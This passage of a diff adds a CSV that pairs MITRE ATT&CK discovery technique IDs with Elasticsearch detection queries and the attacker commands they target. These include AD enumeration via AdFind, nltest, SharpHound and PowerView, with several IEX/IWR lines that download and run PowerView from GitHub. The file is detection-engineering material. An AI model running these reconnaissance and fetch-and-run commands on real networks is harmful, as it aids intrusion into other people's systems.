@@ -1,0 +1,1633 @@
+﻿T1087.001,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""net user""}},
+                {""match_phrase"": {""CommandLine"": ""dir c:\\Users""}},
+                {""match_phrase"": {""CommandLine"": ""ls C:/Users""}},
+                {""match_phrase"": {""CommandLine"": ""ls C:\\Users""}},
+                {""match_phrase"": {""CommandLine"": ""get-childitem C:\\Users""}},
+                {""match_phrase"": {""CommandLine"": ""cmdkey* /list""}},
+                {""match_phrase"": {""CommandLine"": ""net localgroup *Users""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net user 
+&& dir c:\Users\ 
+&& cmdkey.exe /list 
+&& net localgroup ""Users"" 
+&& net localgroup users
+
+get-localuser;
+ls C:/Users; 
+get-childitem C:\Users\;",2,
+T1087.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""query user""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",query user /SERVER:$env:COMPUTERNAME,2,
+T1087.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
+                {""match_phrase"": {""CommandLine"": ""Win32_UserAccount""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Get-WmiObject -Class Win32_UserAccount,2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""net user""}},
+                {""match"": {""CommandLine"": ""domain""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net user /domain
+
+net user #{domain.user.name} /domain
+
+net user administrator /domain",2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""get-localgroupmember""}},
+                {""match"": {""CommandLine"": ""Users""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",get-localgroupmember -group Users; ,2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""-sc admincountdmp""}},
+                {""match_phrase"":{""CommandLine"": ""-sc exchaddresses""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","12011c_AdFind.exe -sc admincountdmp
+
+12011c_AdFind.exe -sc exchaddresses",2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""objectcategory=person""}},
+                {""match"": {""CommandLine"": ""-f""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -f (objectcategory=person),2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""adsisearcher""}},
+                {""match_phrase"":{""CommandLine"": ""objectcategory=user""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","([adsisearcher]""objectcategory=user"").FindAll(); 
+([adsisearcher]""objectcategory=user"").FindOne()",2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"": {""CommandLine"": ""*AdFind*""}},
+                        {""match"": {""CommandLine"": ""-s""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""base""}},
+                        {""match"": {""CommandLine"": ""lockoutduration""}},
+                        {""match"": {""CommandLine"": ""lockoutthreshold""}},
+                        {""match"": {""CommandLine"": ""lockoutobservationwindow""}},
+                        {""match"": {""CommandLine"": ""maxpwdage""}},
+                        {""match"": {""CommandLine"": ""minpwdage""}},
+                        {""match"": {""CommandLine"": ""minpwdlength""}},
+                        {""match"": {""CommandLine"": ""pwdhistorylength""}},
+                        {""match"": {""CommandLine"": ""pwdproperties""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties,2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Invoke-Expression""}},
+                {""match_phrase"": {""CommandLine"": ""ADRecon.ps1""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Invoke-Expression $env:TEMP\ADRecon.ps1,2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-ADObject""}},
+                {""match_phrase"": {""CommandLine"": ""-LDAPFilter""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Try {;
+     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;
+      ; }; 
+Catch {;
+     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;
+   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online;
+ } else {;
+   Install-WindowsFeature RSAT-AD-PowerShell; 
+}; 
+};  ;  
+Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain",2,
+T1087.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-DomainUser""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-DomainUser -verbose",（无法运行pws）,
+T1018,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""/all""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                         {""match_phrase"":{""CommandLine"": ""net view""}},
+                {""match"":{""CommandLine"": ""domain""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net view /domain 
+&& net view",2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""objectcategory=computer""}},
+                {""match"": {""CommandLine"": ""-f""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -f (objectcategory=computer),2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""-sc dclist""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -sc dclist,2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"":{""CommandLine"": ""nltest*""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""/dsgetdc""}},
+                        {""match"":{""CommandLine"": ""/dclist""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","nltest /dsgetdc:$env:USERDOMAIN
+
+nltest.exe /dclist:%userdnsdomain%",2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""Get-DomainComputer""}},
+                {""match_phrase"":{""CommandLine"": ""Get-DomainController""}},
+                {""match_phrase"":{""CommandLine"": ""Get-AdComputer""}},
+                {""match_phrase"":{""CommandLine"": ""Get-NetComputer""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Import-Module .\powerview.ps1;
+Get-DomainComputer
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-DomainController -verbose
+
+Get-AdComputer -Filter *
+
+Import-Module .\PowerView.ps1 -Force;
+Get-NetComputer",（无法运行pws））,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""adsisearcher""}},
+                {""match_phrase"":{""CommandLine"": ""objectcategory=computer""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","([adsisearcher]""objectcategory=computer"").FindAll(); 
+([adsisearcher]""objectcategory=computer"").FindOne()",2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""New-Object System.DirectoryServices.DirectorySearcher""}},
+                {""match_phrase"":{""CommandLine"": ""objectcategory=computer""}},
+                {""wildcard"":{""CommandLine"": ""*.findall""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(""(ObjectCategory=Computer)""); $DirectorySearcher.PropertiesToLoad.Add(""Name""); 
+$Computers = $DirectorySearcher.findall(); 
+foreach ($Computer in $Computers) {;
+   $Computer = $Computer.Properties.name;
+   if (!$Computer) { Continue };
+   Write-Host $Computer}",2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""nbtstat* -A""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",nbtstat -A #{remote.host.ip},2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""get-wmiobject""}},
+                {""match_phrase"": {""CommandLine"": ""ds_computer""}},
+                {""match_phrase"": {""CommandLine"": ""root\\directory\\ldap""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",get-wmiobject -class ds_computer -namespace root\directory\ldap,2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match"": {""CommandLine"": ""adidnsdump""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"":{""CommandLine"": ""-u""}},
+                        {""match"":{""CommandLine"": ""-p""}},
+                        {""match"":{""CommandLine"": ""-zones""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",adidnsdump -u domain\user -p password --print-zones 192.168.1.1,2,
+T1018,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match"":{""CommandLine"": ""nslookup""}},
+                {""match"":{""CommandLine"": ""ping""}},
+                {""match_phrase"":{""CommandLine"": ""arp -a""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]; 
+$pieces = $localip.split("".""); 
+$firstOctet = $pieces[0]; 
+$secondOctet = $pieces[1]; 
+$thirdOctet = $pieces[2]; 
+foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}
+
+nslookup #{remote.host.ip}
+
+for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
+
+arp -a",2,
+T1482,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""objectcategory=organizationalUnit""}},
+                {""match"": {""CommandLine"": ""-f""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -f (objectcategory=organizationalUnit),2,
+T1482,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""-sc trustdmp""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -gcb -sc trustdmp,2,
+T1482,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""Get-DomainTrust""}},
+                {""match_phrase"":{""CommandLine"": ""Get-ForestTrust""}},
+                {""match_phrase"":{""CommandLine"": ""Get-NetDomainTrust""}},
+                {""match_phrase"":{""CommandLine"": ""Get-NetForestTrust""}},
+                {""match_phrase"":{""CommandLine"": ""Get-ADDomain""}},
+                {""match_phrase"":{""CommandLine"": ""Get-ADGroupMember""}},
+                {""match_phrase"":{""CommandLine"": ""Get-NetDomain""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-DomainTrust -Verbose
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-ForestTrust -Verbose
+
+Import-Module .\powerview.ps1 -Force;
+Get-NetDomain | ConvertTo-Json -Depth 1
+
+Import-Module ""$env:TEMP\PowerView.ps1""; 
+Get-NetDomainTrust; 
+Get-NetForestTrust; 
+Get-ADDomain; 
+Get-ADGroupMember Administrators -Recursive",2,
+T1482,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""objectClass=trustedDomain""}},
+                {""wildcard"": {""CommandLine"": ""dsquery*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",2,
+T1482,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""nltest*""}},
+                {""match"": {""CommandLine"": ""/domain_trusts""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",nltest /domain_trusts,2,
+T1016,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""invoke-command""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                         {""wildcard"": {""CommandLine"": ""ipconfig*""}},
+                {""match_phrase"": {""CommandLine"": ""net config""}},
+                {""match_phrase"": {""CommandLine"": ""net view /all""}},
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","ipconfig
+
+net config workstation
+
+net view /all",2,
+T1016,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""objectcategory=subnet""}},
+                {""match"": {""CommandLine"": ""-f""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",12011c_AdFind.exe -f (objectcategory=subnet),2,
+T1016,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""nbtstat*""}},
+                {""match"": {""CommandLine"": ""-n""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",nbtstat -n,2,
+T1016,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""netsh*""}},
+                {""match"": {""CommandLine"": ""advfirewall""}},
+                {""match_phrase"": {""CommandLine"": ""show rule""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",netsh advfirewall firewall show rule name=all,2,
+T1016,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""netsh*""}},
+                {""match"": {""CommandLine"": ""interface""}},
+                {""match_phrase"": {""CommandLine"": ""show interface""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",netsh interface show interface,2,
+T1069.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""\\SharpHound""}},
+                {""wildcard"": {""CommandLine"": ""*UserDnsDomain""}},
+                {""wildcard"": {""CommandLine"": ""*LocalAdmin""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","New-Item -Path ""$env:TEMP\SharpHound\"" -ItemType Directory > $null; 
+& ""$env:TEMP\SharpHound.exe"" -d ""$env:UserDnsDomain"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory ""$env:TEMP\SharpHound\""",2,
+T1069.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""net localgroup""}},
+                        {""match_phrase"": {""CommandLine"": ""get-localgroupmember""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""must"":[
+                        {""match"":{""CommandLine"": ""Administrators""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}
+","net localgroup 
+&& net localgroup ""Administrators""
+
+get-localgroup; 
+Get-LocalGroupMember -Name ""Administrators""",2,
+T1069.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""gpresult*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",gpresult /R,2,
+T1069.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
+                {""match_phrase"": {""CommandLine"": ""Win32_Group""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Get-WMIObject Win32_Group,2,
+T1069.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""wmic*""}},
+                {""match_phrase"": {""CommandLine"": ""get name""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",wmic.exe group get name,2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""get-ADPrincipalGroupMembership""}},
+                {""match"":{""CommandLine"": ""administrator""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",get-ADPrincipalGroupMembership administrator | select name,2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""objectcategory=group""}},
+                {""match"": {""CommandLine"": ""-f""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",#{adfind_path} -f (objectcategory=group),2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""adsisearcher""}},
+                {""match_phrase"":{""CommandLine"": ""objectcategory=group""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","([adsisearcher]""objectcategory=group"").FindAll(); 
+([adsisearcher]""objectcategory=group"").FindOne()",2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-AdGroup""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Get-AdGroup -Filter *,2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""net group""}},
+                {""match"": {""CommandLine"": ""domain""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net localgroup 
+&& net group /domain 
+&& net group ""domain admins"" /domain 
+&& net group ""enterprise admins"" /domain",2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""should"":[
+                      {""match_phrase"":{""CommandLine"": ""Get-NetLocalGroupMember""}},
+                {""match_phrase"":{""CommandLine"": ""Invoke-EnumerateLocalAdmin""}},
+                {""match_phrase"":{""CommandLine"": ""Find-LocalAdminAccess""}},
+                {""match_phrase"":{""CommandLine"": ""Get-DomainGroup""}},
+                {""match_phrase"":{""CommandLine"": ""Get-DomainGroupMember""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""PowerView.ps1""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Import-Module .\powerview.ps1;
+$userName = ""#{domain.user.name}"";
+$userPassword = ""#{domain.user.password}"";
+$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;
+$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);
+Get-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Invoke-EnumerateLocalAdmin  -Verbose
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Find-LocalAdminAccess -Verbose
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-DomainGroup -verbose
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-DomainGroupMember ""Domain Admins""",2,"
+"
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""net? groups""}},
+                {""match"": {""CommandLine"": ""/doma*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net group /domai ""Domain Admins"" 
+&& net groups ""Account Operators"" /doma 
+&& net groups ""Exchange Organization Management"" /doma 
+&& net group ""BUILTIN\Backup Operators"" /doma",2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""get-aduser""}},
+                        {""wildcard"": {""CommandLine"": ""pr*""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"":{""CommandLine"": ""DoesNotRequirePreAuth""}},
+                        {""match"":{""CommandLine"": ""useraccountcontrol""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
+
+Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name",2,
+T1069.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Find-GPOComputerAdmin""}},
+                {""match"": {""CommandLine"": ""-ComputerName""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose""",2,
+T1010,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Select-Object MainWindowTitle""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$x = Get-Process | Where-Object {$_.MainWindowTitle -ne """"} | Select-Object MainWindowTitle;
+$a = New-Object -com ""Shell.Application""; 
+$b = $a.windows() | select-object LocationName;
+write-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)",2,
+T1010,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""csc*""}},
+                {""match_phrase"":{""CommandLine"": ""1b4409_T1010.cs""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe 1b4409_T1010.cs 
+&& %TEMP%\T1010.exe",2,
+T1518,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty""}},
+                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Uninstall""}},
+                        {""match_phrase"": {""CommandLine"": ""Select-Object""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""DisplayName""}},
+                        {""match"": {""CommandLine"": ""DisplayVersion""}},
+                        {""match"": {""CommandLine"": ""Publisher""}},
+                        {""match"": {""CommandLine"": ""InstallDate""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; 
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",2,
+T1518,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match"": {""CommandLine"": ""--version""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""python4""}},
+                        {""match"": {""CommandLine"": ""python3""}},
+                        {""match"": {""CommandLine"": ""python2""}},
+                        {""match"": {""CommandLine"": ""python""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",python3 --version&python2 --version&python --version,2,
+T1518,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""reg query""}},
+                {""match_phrase"":{""CommandLine"": ""Software\\Microsoft\\Internet Explorer""}},
+                {""match"": {""CommandLine"": ""svcVersion""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion",2,
+T1518,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-ItemProperty""}},
+                {""match_phrase"":{""CommandLine"": ""Software\\Microsoft\\Internet Explorer""}},
+                {""wildcard"": {""CommandLine"": ""*Version""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer').Version,2,
+T1518.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""get-uac""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",echo $(get-uac),2,
+T1518.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""root\\SecurityCenter2""}},
+                        {""match"": {""CommandLine"": ""AntiVirusProduct""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""wildcard"":{""CommandLine"": ""wmic*""}},
+                        {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
+
+wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+
+$NameSpace = Get-WmiObject -Namespace ""root"" -Class ""__Namespace"" | Select Name | Out-String -Stream | Select-String ""SecurityCenter"";
+$SecurityCenter = $NameSpace | Select-Object -First 1;
+Get-WmiObject -Namespace ""root\$SecurityCenter"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;",2,
+T1518.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""netsh*""}},
